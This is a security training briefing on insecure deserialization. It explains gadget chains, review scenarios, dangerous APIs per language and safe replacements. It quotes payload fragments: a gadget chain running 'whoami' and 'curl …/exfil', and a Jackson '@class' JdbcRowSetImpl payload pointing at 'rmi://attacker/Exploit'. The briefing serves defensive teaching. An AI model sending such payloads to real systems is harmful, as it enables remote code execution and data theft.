# Insecure Deserialization — When Data Parsing Becomes Code Execution

> **Source:** Check Point internal code-review training briefing (deserialization) + [PortSwigger Web Security Academy](https://portswigger.net/web-security/deserialization) + [OWASP Deserialization Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Deserialization_Cheat_Sheet.html) + [Microsoft Learn — BinaryFormatter security](https://learn.microsoft.com/en-us/dotnet/standard/serialization/binaryformatter-security-guide) (web search, 2026-06)
> **Author:** Yosi Izaq
> **Captured:** 2026-06-14
> **Status:** Active
> **Type:** compiled

---

## TL;DR

**Deserialization turns bytes back into objects.** If attacker-controlled bytes reach a *native/object* deserializer (or a polymorphic type binder), the runtime can execute code **during parsing** — through constructors, magic hooks, and **gadget chains** of existing library classes — *before any of your validation runs*. Outcome: remote code execution (RCE), often unauthenticated and with full process privileges.

**The one rule:** never feed attacker-influenced input to a native deserializer or let it choose the runtime type/class. Accept **data-only formats** (JSON/protobuf) into explicit DTOs, validate strictly, then map deterministically. Signatures/HMAC, auth, and "internal only" are defense-in-depth — **not** a substitute.

> *"It can be argued that it is not possible to securely deserialize untrusted input."* — PortSwigger

---

## Code-Review Lens (you don't need exploit expertise)

Catch it at review with **one question**:

> **Can attacker-influenced input control object reconstruction or runtime type binding?**
>
> If yes → block the change until the flow is **data-only**, validation is **strict**, and type→handler mapping is **explicit and allow-listed**.

> **Incident anchor — WSUS, October 2025 (CVE-2025-59287).** A Windows Server Update Services code path that "just handled internal data" deserialized untrusted input and became an **unauthenticated RCE running as SYSTEM** — full machine control. CISA issued an active-exploitation warning, and Microsoft had to ship a **second patch** after the first fix proved incomplete. **Takeaway:** if untrusted input reaches deserialization with powerful features, *assume RCE*. — [ITPro report](https://www.itpro.com)

### Why "validate after parsing" doesn't work

The dangerous code runs *during* `deserialize()`, not after it returns. By the time your `if (!valid) reject()` line executes, the gadget chain has already fired. **The fix must be at the parse boundary, not after it.**

### Code-review challenge — 3 scenarios

Same drill: find where attacker bytes trigger execution during deserialization, pick the **minimum** fix that keeps the feature.

**Scenario 1 — Raw client bytes hit the deserializer.** A `/support/restore` endpoint runs `serialize.unserialize(req.body.snapshot)` on client-controlled bytes (e.g. Base64 `rO0ABXNy…`). The embedded gadget chain executes (`whoami`, `curl …/exfil`) the moment it parses — attacker needs neither your source nor your session format.
- ✅ **Fix:** accept **data-only input (JSON/protobuf DTO)**, enforce **strict schema validation**, then map deterministically to domain objects.
- ❌ Keep unsafe reconstruction + add type checks / admin-only auth / rate limits / audit logs — all run *after* the payload has already executed.
- ❌ Delete the feature — unnecessary; a deterministic safe design exists.

**Scenario 2 — "Signed" cached session.** Server gets `{raw, sig}` from the client, verifies the HMAC, then `unsafeDeserialize(raw)`. `raw` may encode executable hooks (e.g. Python `__reduce__`) that run while parsing.
- ✅ **Fix:** **remove attacker influence** — clients don't supply cached bytes at all; only the service writes cache entries, values are **data-only (JSON/protobuf)** validated before use.
- ❌ Add HMAC + rate limits + logging around the same deserializer — **a signature proves integrity, not safety.** It just guarantees you faithfully deserialize the attacker's bytes if the key ever leaks/is shared.
- ❌ Disable the endpoint — feature is salvageable with a data-only design.

**Scenario 3 — Polymorphic type binding.** An admin panel sends a `type` field; the backend lets the *incoming value* pick which class to instantiate. Payload: `{"@class":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"rmi://attacker/Exploit",…}` → remote JNDI lookup / RCE.
- ✅ **Fix:** parse into a **data-only DTO**, strictly validate fields/types/bounds, and map the `type` through an **explicit allow-listed switch/map** to known handler classes.
- ❌ Keep polymorphic parsing + blocklist "suspicious" class names — blacklists never enumerate every gadget; attacker controls type resolution.
- ❌ Disable custom rule-actions entirely — over-correction; allow-listed mapping keeps the feature.

**Review shortcut:** if attacker-influenced input can pick a class or reconstruct an object graph, block until it's data-only and explicitly mapped.

---

## What it is

- **Serialization** flattens an object graph into a byte stream (for caches, queues, cookies, files, IPC). **Deserialization** rebuilds the objects.
- **Insecure deserialization** = deserializing *untrusted* data with a deserializer powerful enough to instantiate arbitrary types and run lifecycle hooks. Also called **object injection**.
- **Gadget chain** = a sequence of *already-present* library classes wired together so that reconstructing them triggers a cascade (one class's hook calls the next) ending in a dangerous sink (command exec, JNDI lookup, file write). The attacker injects **no new code** — they reuse yours and your dependencies'. (Java's [`ysoserial`](https://github.com/frohoff/ysoserial) is the canonical gadget-chain toolkit.)
- **Impact:** RCE, privilege escalation, arbitrary file read/write, SSRF (via JNDI/RMI), and DoS.

## Per-language danger map

| Stack | Dangerous (avoid on untrusted data) | Indicator / magic bytes | Safe alternative |
|-------|-------------------------------------|-------------------------|------------------|
| **Java** | native `ObjectInputStream.readObject`, Jackson `enableDefaultTyping`, XStream | Base64 `rO0AB…` / hex `AC ED 00 05` | JSON/DTOs; override `resolveClass` (allow-list) / SerialKiller; audit deps (drop old Commons-Collections, Jackson) |
| **Python** | `pickle`, `cPickle`, `shelve`, `marshal`, `yaml.load`, `jsonpickle` | pickle opcodes; `__reduce__` hooks | `json`, `yaml.safe_load`, protobuf; validate with Pydantic; Bandit in CI |
| **PHP** | `unserialize()` on user data | serialized string `O:8:"…"`, `__wakeup`/`__destruct` magic | `json_decode()`; if `unserialize` is unavoidable, `allowed_classes => false` |
| **.NET** | `BinaryFormatter`, `SoapFormatter`, `NetDataContractSerializer`, `ObjectStateFormatter`, JSON.NET `TypeNameHandling != None` | — | `System.Text.Json`, `DataContractSerializer`, `XmlSerializer`; `TypeNameHandling.None` |
| **Node.js** | `node-serialize` `unserialize()`, `serialize-to-js`, `funcster` (eval functions) | `_$$ND_FUNC$$_` marker in payload | `JSON.parse` + schema (zod/ajv); never deserialize functions |
| **Ruby** | `Marshal.load`, unsafe `YAML.load` | — | `JSON.parse`, `YAML.safe_load` |

---

## Prevention & Defense (in priority order)

1. **Don't deserialize untrusted input at all** — the only fully safe option. Avoid native/object deserializers on anything that crosses a trust boundary.
2. **Use data-only formats** — JSON, protobuf, MessagePack — parsed into **explicit DTOs**. Data formats can't carry executable object graphs.
3. **Strict allow-list validation** *before* mapping — types, enums, ranges, lengths, required fields. Map input `type` fields through an explicit allow-listed switch/map, never via attacker-chosen class names.
4. **Disable polymorphic / default typing** on any potentially-untrusted data (Jackson default typing, JSON.NET `TypeNameHandling`, etc.).
5. **If a native deserializer is truly unavoidable:** restrict resolvable classes to a hard allow-list (Java `resolveClass`/SerialKiller, PHP `allowed_classes`), run with least privilege, and audit dependencies for known gadget libraries (OWASP Dependency-Check, Snyk).
6. **Defense-in-depth (never primary):** integrity checks (HMAC/signatures) — *integrity ≠ safety*; authentication; network isolation; logging/alerting; resource limits for DoS.

---

## 📋 1-Pager Cheat Sheet — Safe Deserialization

> Copy/paste into a PR checklist.

```
INSECURE DESERIALIZATION — QUICK REFERENCE
==========================================

GOLDEN RULE
  Never feed attacker-influenced input to a native deserializer or let it pick
  the runtime type/class. Accept data-only (JSON/protobuf) → validate → map deterministically.

REVIEW HEURISTIC (one question)
  "Can attacker-influenced input control object reconstruction or runtime type binding?"
  If yes → BLOCK until: data-only format + strict validation + explicit allow-listed type→handler map.
  (The exploit runs DURING parse — "validate after deserialize" is already too late.)

🔴 RED FLAGS (stop and investigate)
  ⚠ Untrusted input reaches native/object deserialization or runtime type/class binding
  ⚠ Polymorphic / default typing enabled on possibly-attacker-controlled data
  ⚠ "Checks after parse" or class-name string filtering proposed as the main fix
  ⚠ "admin-only" / "internal only" used to justify keeping unsafe parsing

✅ MINIMUM ACCEPTABLE FIXES
  ✅ Data-only formats (JSON/protobuf) + explicit DTOs
  ✅ Strict allow-list validation (types, ranges, enums, lengths) BEFORE mapping
  ✅ Deterministic mapping from input "type" → known handler/class (allow-list)
  ✅ HMAC/signatures + auth + limits = defense-in-depth, NOT primary safety

❌ NOT A FIX
  ❌ Filtering class-name strings while keeping attacker-controlled type resolution
  ❌ Type checks only AFTER deserialization happened
  ❌ Auth / logging / "it's internal" used to justify unsafe parsing
  ❌ Turning the feature off when a deterministic safe design is feasible

DANGEROUS APIs → SAFE SWAP
  Java   ObjectInputStream.readObject / Jackson defaultTyping → JSON DTO; resolveClass allow-list
  Python pickle / yaml.load / marshal                        → json / yaml.safe_load / protobuf + Pydantic
  PHP    unserialize($userData)                              → json_decode (or allowed_classes=>false)
  .NET   BinaryFormatter / TypeNameHandling!=None            → System.Text.Json / DataContractSerializer
  Node   node-serialize.unserialize                          → JSON.parse + zod/ajv schema
  Ruby   Marshal.load / YAML.load                            → JSON.parse / YAML.safe_load

MAGIC BYTES (spotting native payloads)
  Java   rO0AB…  (Base64) /  AC ED 00 05 (hex)
  PHP    O:8:"ClassName":…   ·   Python: __reduce__ hook   ·   Node: _$$ND_FUNC$$_
```

---

## See Also

- [`xss-cross-site-scripting.md`](xss-cross-site-scripting.md) — sibling code-review briefing (XSS): same "one-question review heuristic" framing, untrusted-input-to-execution pattern.
- [`interviews/security-patterns.md`](interviews/security-patterns.md) — broader app-security interview patterns (input validation, SQL injection, CSP).

### External references

- [PortSwigger — Insecure deserialization](https://portswigger.net/web-security/deserialization)
- [OWASP — Deserialization Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Deserialization_Cheat_Sheet.html) · [Insecure Deserialization (community)](https://owasp.org/www-community/vulnerabilities/Insecure_Deserialization)
- [Microsoft Learn — BinaryFormatter security guide](https://learn.microsoft.com/en-us/dotnet/standard/serialization/binaryformatter-security-guide)
- [ysoserial (Java gadget chains)](https://github.com/frohoff/ysoserial) · [Baeldung — Java deserialization vulnerabilities](https://www.baeldung.com/java-deserialization-vulnerabilities)
